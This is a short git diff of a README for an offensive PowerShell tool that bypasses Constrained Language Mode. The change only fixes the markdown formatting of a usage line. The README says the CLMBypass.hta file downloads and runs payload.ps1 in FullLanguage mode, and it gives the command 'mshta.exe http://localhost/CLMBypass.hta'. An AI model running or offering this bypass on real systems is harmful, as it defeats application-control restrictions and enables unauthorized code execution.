@@ -15,7 +15,7 @@ Bypass Constrained Language Mode in PowerShell, based off of [SecJuice's](https:
 ### CLMBypass.hta [A][C]
 - The WScript.Shell creates a new runspace
 - `payload.ps1` is downloaded and executed in FullLanguage mode
-- **Usage:** mshta.exe http://localhost/CLMBypass.hta`
+- **Usage:** `mshta.exe http://localhost/CLMBypass.hta`
 
 ### CLMBypass.js [A][C]
 - Realized this is redundant... the hta execution already creates another runspace with FullLanguage mode. Leaving it here just in case.
